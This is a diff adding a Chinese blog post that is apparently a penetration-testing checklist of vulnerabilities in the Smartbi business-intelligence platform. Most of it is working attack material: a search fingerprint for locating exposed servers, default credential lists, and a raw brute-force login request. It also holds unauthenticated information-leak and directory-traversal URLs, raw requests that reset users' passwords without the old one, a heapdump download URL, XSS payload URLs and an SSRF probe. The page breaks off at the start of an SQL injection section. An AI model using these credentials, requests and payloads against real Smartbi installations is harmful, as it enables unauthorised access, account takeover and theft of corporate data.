@@ -1,0 +1,1038 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>SmartBi 漏洞 Checklist - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="SmartBi 漏洞 Checklist" />
+<meta property="og:description" content="SmartBi 漏洞 Checklist 一、前置知识 0x01 SmartBi 概述 Smartbi 是企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析、自助分析平台、数据挖掘建模、AI 智能分" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/smartbi-%E6%BC%8F%E6%B4%9E-checklist/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="SmartBi 漏洞 Checklist"/>
+<meta name="twitter:description" content="SmartBi 漏洞 Checklist 一、前置知识 0x01 SmartBi 概述 Smartbi 是企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析、自助分析平台、数据挖掘建模、AI 智能分"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/smartbi-%E6%BC%8F%E6%B4%9E-checklist/" /><link rel="prev" href="http://example.org/smartbi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="http://example.org/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "SmartBi 漏洞 Checklist",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/smartbi-%E6%BC%8F%E6%B4%9E-checklist\/"
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  4546 ,
+        "url": "http:\/\/example.org\/smartbi-%E6%BC%8F%E6%B4%9E-checklist\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SmartBi 漏洞 Checklist</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;4546 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;10 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#一前置知识">一、前置知识</a>
+      <ul>
+        <li><a href="#0x01-smartbi-概述">0x01 SmartBi 概述</a></li>
+        <li><a href="#0x02-fofa指纹">0x02 FOFA指纹</a></li>
+        <li><a href="#0x03-登录入口">0x03 登录入口</a></li>
+        <li><a href="#0x04-常见口令">0x04 常见口令</a></li>
+      </ul>
+    </li>
+    <li><a href="#二认证漏洞">二、认证漏洞</a>
+      <ul>
+        <li><a href="#0x01-登录爆破">0x01 登录爆破</a></li>
+        <li><a href="#0x02-401认证弱口令">0x02 401认证弱口令</a></li>
+      </ul>
+    </li>
+    <li><a href="#三信息泄露">三、信息泄露</a>
+      <ul>
+        <li><a href="#0x01-敏感信息">0x01 敏感信息</a>
+          <ul>
+            <li><a href="#查看版本">查看版本</a></li>
+            <li><a href="#目录遍历">目录遍历</a></li>
+            <li><a href="#信息泄露">信息泄露</a></li>
+            <li><a href="#接口泄露">接口泄露</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x02-session劫持">0x02 Session劫持</a></li>
+        <li><a href="#0x03-heapdump泄露">0x03 Heapdump泄露</a></li>
+        <li><a href="#0x04-反射型存储型xss">0x04 反射型/存储型XSS</a></li>
+        <li><a href="#0x05-ssrf">0x05 SSRF</a></li>
+      </ul>
+    </li>
+    <li><a href="#四sql注入">四、SQL注入</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#0x01-解码并修改数据包直接注入">0x01 解码并修改数据包直接注入</a></li>
+            <li><a href="#0x02-rmiservet加密后注入">0x02 RMIServet加密后注入</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#五任意文件读取">五、任意文件读取</a></li>
+    <li><a href="#附录rmiservet加解密">附录、RMIServet加解密</a>
+      <ul>
+        <li><a href="#0x01-rmiservlet加密">0x01 RMIServlet加密</a></li>
+        <li><a href="#0x02-直接传输">0x02 直接传输</a></li>
+        <li><a href="#0x03-rmiservet加解密脚本">0x03 RMIServet加解密脚本</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="smartbi-漏洞-checklist">SmartBi 漏洞 Checklist</h1>
+<h2 id="一前置知识">一、前置知识</h2>
+<h3 id="0x01-smartbi-概述">0x01 SmartBi 概述</h3>
+<p>Smartbi 是企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析、自助分析平台、数据挖掘建模、AI 智能分析等大数据分析需求。该软件应用范围较广，据官网介绍，在全球财富 500 强的 10 家国内银行，有 8 家选用了 Smartbi。</p>
+<h3 id="0x02-fofa指纹">0x02 FOFA指纹</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app=&#34;SMARTBI&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="0x03-登录入口">0x03 登录入口</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/mobileportal.jsp
+</span></span><span class="line"><span class="cl">https://127.0.0.1/vision/mobileX/login
+</span></span><span class="line"><span class="cl">https://127.0.0.1/vision/index.jsp
+</span></span><span class="line"><span class="cl">https://127.0.0.1/smartbi/vision/index.jsp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>密码正确的情况下，部分平台无法登陆，此时设置user-agent为手机端就可以。</p>
+<h3 id="0x04-常见口令">0x04 常见口令</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">demo/demo
+</span></span><span class="line"><span class="cl">manager/demo
+</span></span><span class="line"><span class="cl">admin/admin
+</span></span><span class="line"><span class="cl">admin/manager
+</span></span><span class="line"><span class="cl">admin/2manager
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="二认证漏洞">二、认证漏洞</h2>
+<h3 id="0x01-登录爆破">0x01 登录爆破</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /vision/RMIServlet HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 127.0.0.1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Referer: https://127.0.0.1/vision/mobileX/login
+</span></span><span class="line"><span class="cl">content-type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: 70
+</span></span><span class="line"><span class="cl">Authorization: Basic YWRtaW46YWRtaW4=
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Cookie: JSESSIONID=1DA1DAA51469E646F97AD829F29A2B15
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">className=UserService&amp;methodName=login&amp;params=[&#34;admin&#34;,&#34;admin&#34;]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>抓取 true/false 字段。</p>
+<h3 id="0x02-401认证弱口令">0x02 401认证弱口令</h3>
+<p>/vision 目录下的文件都需要 401 认证：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin/admin
+</span></span><span class="line"><span class="cl">admin/manager
+</span></span><span class="line"><span class="cl">admin/2manager
+</span></span><span class="line"><span class="cl">mining/admin
+</span></span><span class="line"><span class="cl">demo/demo
+</span></span><span class="line"><span class="cl">manager/demo
+</span></span><span class="line"><span class="cl">manager/admin
+</span></span><span class="line"><span class="cl">user/admin
+</span></span><span class="line"><span class="cl">test/admin
+</span></span><span class="line"><span class="cl">huanan/admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>不论用户名输什么，只要密码正确即可。</p>
+<h2 id="三信息泄露">三、信息泄露</h2>
+<h3 id="0x01-敏感信息">0x01 敏感信息</h3>
+<h4 id="查看版本">查看版本</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/version.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/packageinfo.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="目录遍历">目录遍历</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=%2F
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="信息泄露">信息泄露</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/monitor/sysprops.jsp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/monitor/getclassurl.jsp?classname=smartbi.freequery.expression.ast.TextNode
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/monitor/hardwareinfo.jsp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="接口泄露">接口泄露</h4>
+<p>直接访问 wsdl 无需 401：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/listwsdl.jsp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>提供资源目录树的访问功能：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/services/CatalogService?wsdl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>SimpleReportService 提供灵活报表相关操作功能：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/services/SimpleReportService?wsdl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>BusinessViewService 提供数据集定义相关操作功能：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/services/BusinessViewService?wsdl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>DataSourceService 提供数据源相关操作功能：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/services/DataSourceService?wsdl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>AnalysisReportService 提供多维分析相关操作功能：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/services/AnalysisReportService?wsdl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>UserManagerService 提供用户相关操作，包括读取/维护用户信息、读取/维护组信息、读取/维护角色信息、为用户和组分配角色等：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/services/UserManagerService?wsdl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="0x02-session劫持">0x02 Session劫持</h3>
+<p>可重置用户密码，且无需原密码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/monitor/listsessions.jsp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20230717111349311.png"
+        data-srcset="images/image-20230717111349311.png, images/image-20230717111349311.png 1.5x, images/image-20230717111349311.png 2x"
+        data-sizes="auto"
+        alt="images/image-20230717111349311.png"
+        title="image-20230717111349311" /></p>
+<p>理论上重置成功，返回为 true，但是实际测试过程中修改后的密码既不是改之前的密码，也不是修改后的密码，过一段时间自动重置为原来的密码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /vision/RMIServlet HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 127.0.0.1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Referer: https://127.0.0.1/vision/index.jsp
+</span></span><span class="line"><span class="cl">If-Modified-Since: 0
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+</span></span><span class="line"><span class="cl">Content-Length: 148
+</span></span><span class="line"><span class="cl">Authorization: Basic YWRtaW46YWRtaW4=
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Cookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">className=UserService&amp;methodName=updateUserForChange&amp;params=[&#34;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&#34;,&#34;zhongguo1&#34;,&#34;null&#34;,&#34;QWEqwe123&#34;,true]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /vision/RMIServlet HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 127.0.0.1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Referer: https://127.0.0.1/vision/index.jsp
+</span></span><span class="line"><span class="cl">If-Modified-Since: 0
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+</span></span><span class="line"><span class="cl">Content-Length: 133
+</span></span><span class="line"><span class="cl">Authorization: Basic YWRtaW46YWRtaW4=
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Cookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">className=UserService&amp;methodName=addUserAttribute&amp;params=[&#34;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&#34;,&#34;SYSTEM_user_isEdit&#34;,&#34;0&#34;,null]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中I8a94ca4e0175ab4aab4aaae90175d3e824c66a87为用户的id字段，唯一身份标识。</p>
+<h3 id="0x03-heapdump泄露">0x03 Heapdump泄露</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/monitor/heapdump.jsp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/monitor/heapdump.jsp?dumpbin=true
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="0x04-反射型存储型xss">0x04 反射型/存储型XSS</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/chooser.jsp?key=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E&amp;root=/u01/data/domains/app_domain
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/monitor/testmailserver.jsp?host=mail.longtop.com&amp;user=111%22%3E%3Cimg%20src=x%20onerror=prompt(0)%3E&amp;pass=123456
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>登录后个人参数位置，加密后传参可导致存储型 xss。</p>
+<h3 id="0x05-ssrf">0x05 SSRF</h3>
+<p>探测出口ip：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/monitor/testmailserver.jsp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="四sql注入">四、SQL注入</h2>
+<p>需要登录，任意报表功能，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://127.0.0.1/vision/ssreportServlet
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
